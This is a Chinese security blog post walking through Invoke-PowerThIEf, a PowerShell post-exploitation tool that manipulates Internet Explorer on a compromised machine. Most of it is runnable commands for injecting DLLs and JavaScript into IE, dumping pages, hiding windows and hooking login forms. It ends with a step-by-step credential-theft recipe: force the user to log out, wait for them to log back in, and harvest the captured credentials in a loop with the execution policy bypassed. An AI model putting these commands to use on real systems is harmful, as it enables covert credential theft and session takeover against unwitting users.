---
layout: post
title: Invoke-PowerThIEf利用分析
---


## 0x00 前言
---

Invoke-PowerThIEf是一个开源的Powershell脚本，不仅能够用来对IE浏览器窗口的内容进行操作，还能通过Hook的方法捕获IE浏览器的凭据。

地址如下：

https://github.com/nettitude/Invoke-PowerThIEf

本文将要对Invoke-PowerThIEf的功能进行测试，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- 功能测试
- Win7Sp1下的使用方法
- 利用分析

## 0x02 功能测试
---

Invoke-PowerThIEf需要的环境配置如下：

- IE 11
- Win 7-10
- .Net 4.0+
- Powershell 4.0

考虑到以下原因：

- Window7或Windows Server 2008，默认安装PowerShell 2.0
- Windows8或Windows server 2012，默认安装PowerShell 3.0
- Windows 8.1或Windows server 2012 R2，默认安装PowerShell 4.0

首先选择Windows server 2012 R2 x64作为测试环境，可直接运行

常用功能如下：

#### (1)列出IE浏览器的所有页面

```
Invoke-PowerThIEf -action ListUrls
```

#### (2)在IE进程中加载dll

示例如下：

```
Invoke-PowerThIEf -action ExecPayload -PathPayload calc_x64.dll
```

默认会在所有页面中执行加载dll的操作，并且会新建新的页面

例如：

如果当前IE进程有3个页面，执行该操作后会执行3次加载dll的操作，并且会在IE浏览器中新建3个页面

个人认为该功能的效果有限

#### (3)向IE页面中插入JavaScript代码并执行

针对所有页面：

```
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>
```

针对指定页面：

```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script <JavaScript to run>
```

**注：**

`<BrowserIndex>`可通过ListUrls命令获得

示例如下：

```
Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'

Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "alert(`"1`");"
```

#### (4)Dump页面内容

针对所有页面：

```
Invoke-PowerThIEf -action DumpHTML
```

针对指定页面：

```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>
```

针对指定页面的指定元素：

```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>
```

#### (5)隐藏和显示页面

隐藏所有页面：

```
Invoke-PowerThIEf -action HideWindow
```

隐藏指定页面：

```
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>
```

显示所有页面：

```
Invoke-PowerThIEf -action ShowWindow
```

显示指定页面：

```
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>
```

这里会对页面所在的进程iexploer.exe进行隐藏和显示

例如：

如果进程iexploer1.exe下有两个页面A和B，进程iexploer2.exe下有两个页面C和D，如果隐藏页面A，那么会隐藏进程iexploer1.exe下的所有页面A和B，而iexploer2.exe下有的两个页面C和D不受影响

#### (6)页面重定向

控制页面访问指定的URL

针对所有页面：

```
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL>
```

针对指定页面：

```
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL>
```

#### (7)捕获凭据

这里分为两个步骤：

1.命令执行后，将会Hook所有新打开的页面并记录凭据

```
Invoke-PowerThIEf -action HookLoginForms 
```

2.查看已捕获的凭据

```
Invoke-PowerThIEf -action Creds
```

#### (8)新建页面

```
Invoke-PowerThIEf -action NewBackgroundTab
```

## 0x03 Win7Sp1下的使用方法
---

这里使用的测试系统为Win7Sp1 x64

Invoke-PowerThIEf直接在Win7sp1下使用会报错，提示如下：

```
Unable to find type [System.__ComObject]: make sure that the assembly containin
g this type is loaded.
At C:\test\Invoke-PowerThIEf.ps1:151 char:41
+         [OutputType([System.__ComObject] <<<< )]
    + CategoryInfo          : InvalidOperation: (System.__ComObject:String) []
   , ParentContainsErrorRecordException
    + FullyQualifiedErrorId : TypeNotFound
```

这里需要安装Microsoft .NET Framework 4.5和Windows Management Framework 4.0

### 1.安装Microsoft .NET Framework 4.5

命令行下的安装方法可参考之前的文章[《渗透基础——命令行下安装Microsoft .NET Framework》](https://3gstudent.github.io/3gstudent.github.io/渗透基础——命令行下安装Microsoft_.NET_Framework/)

实现自动安装的代码可参考：

https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp

安装后需要等待系统重新启动才能生效

### 2.安装Windows Management Framework 4.0


下载地址：

https://www.microsoft.com/en-us/download/details.aspx?id=40855

命令行下的安装命令如下：

```
wusa.exe Windows6.1-KB2819745-x64-MultiPkg.msu /quiet /norestart
```

安装成功后进程wusa.exe将会自动退出

同样需要等待系统重启启动才能生效

再次执行Invoke-PowerThIEf

报错提示如下：

```
Add-Type : Could not load file or assembly 'Microsoft.mshtml,
Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' or one
of its dependencies. The system cannot find the file specified.
At C:\test\Invoke-PowerThIEf.ps1:362 char:13
+             Add-Type -TypeDefinition $source -Language CSharp
-ReferencedAssembl ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~
    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept
   ion
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS
   hell.Commands.AddTypeCommand
```


错误的原因是代码中使用了：`using mshtml;` ，缺少这个引用文件

Invoke-PowerThIEf在Server2012R2下能够正常使用，于是我尝试比较Server2012R2和Win7系统的差异，看看能否通过替换文件的方式解决这个问题

### 解决方法1

参考资料：

https://www.crifan.com/microsoft_html_object_library_mshtml_tlb_in_com_vs_microsoft_mshtml_microsoft_mshtml_dll_in_dotnet/

在安装VS2015的Server2012R2下尝试导出mshtml.dll，命令如下：

```
C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\x64\tlbimp.exe C:\Windows\System32\mshtml.tlb /out:c:\test\mshtml.dll
```

获得mshtml.dll

将mshtml.dll放在Invoke-PowerThIEf的同级目录下，重命名为Microsoft.mshtml.dll

执行后依旧是同样的错误，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-1.png)

该方法失败

### 解决方法2

经过对比，发现Server2012R2比Win7系统多了文件夹：`C:\Windows\assembly\GAC\Microsoft.mshtml`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-2.png)

具体多出以下文件：

```
C:\Windows\assembly\GAC>tree Microsoft.mshtml /f
Folder PATH listing
Volume serial number is F4B2-E12B
C:\WINDOWS\ASSEMBLY\GAC\MICROSOFT.MSHTML
└───7.0.3300.0__b03f5f7f11d50a3a
        Microsoft.mshtml.dll
        __AssemblyInfo__.ini
```

**注：**

C:\Windows\assembly下文件夹的具体内容只能通过命令行进行查看，无法在Explorer中查看


于是尝试将Server2012R2系统中C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容复制到Win7下面


我已经将C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容提取出来并上传至github，地址如下：

https://github.com/3gstudent/Invoke-PowerThIEf/tree/master/Microsoft.mshtml

在Win7系统的命令行下执行：

```
xcopy Microsoft.mshtml C:\Windows\assembly\GAC\Microsoft.mshtml /i /s /e
```

再次执行Invoke-PowerThIEf，运行成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-3.png)

## 0x04 利用分析
---

Invoke-PowerThIEf的利用场景主要有以下3个：

### 1.控制IE浏览器访问指定页面并获得网页内容

#### (1)创建一个新页面

```
Invoke-PowerThIEf -action NewBackgroundTab
```

#### (2)获得新页面的序号

```
Invoke-PowerThIEf -action ListUrls
```

假设这里的序号为132572

#### (3)将其重定向到指定URL

这里以`https://www.shodan.io/`为例

```
Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl https://www.shodan.io/
```

#### (4)抓取页面结果

```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex 132572
```

#### (5)关闭此页面

```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "window.opener=null;window.open('','_self');window.close();"
```

#### 补充：重定向到空白页面

```
Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl about:blank
```

### 2.抓取凭据

#### (1)列出所有标签

```
Invoke-PowerThIEf -action ListUrls
```

发现后台有shodan的登录页面

#### (2)开启抓取凭据的功能

```
Invoke-PowerThIEf -action HookLoginForms
```

#### (3)强制shodan账号退出登录状态

```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex 525660 -Script "window.location.href = 'https://account.shodan.io/logout';"
```

等待用户重新登录

#### (4)查看抓取到的凭据

```
Invoke-PowerThIEf -action Creds 
```

这里需要注意，执行完步骤2后不能退出Powershell进程，否则无法抓取到新的凭据

如果想要自动实现以上功能，这里可以通过加循环的方法实现每隔10秒在后台抓取凭据，使用的Powershell命令如下：

```
Invoke-PowerThIEf -action HookLoginForms
while(1)
{
    Start-Sleep –s 10
    Write-host "[*] Sleep 10 seconds"
    Invoke-PowerThIEf -action Creds
}
```

执行脚本：

```
powershell -ep bypass -f Invoke-PowerThIEf.ps1
```


### 3.修改页面内容，执行JavaScript代码

针对所有页面：

```
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>
```

针对指定页面：

```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script <JavaScript to run>
```

要实现的功能取决于具体的JavaScript代码

## 0x05 小结
---

本文介绍了Invoke-PowerThIEf支持的功能，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




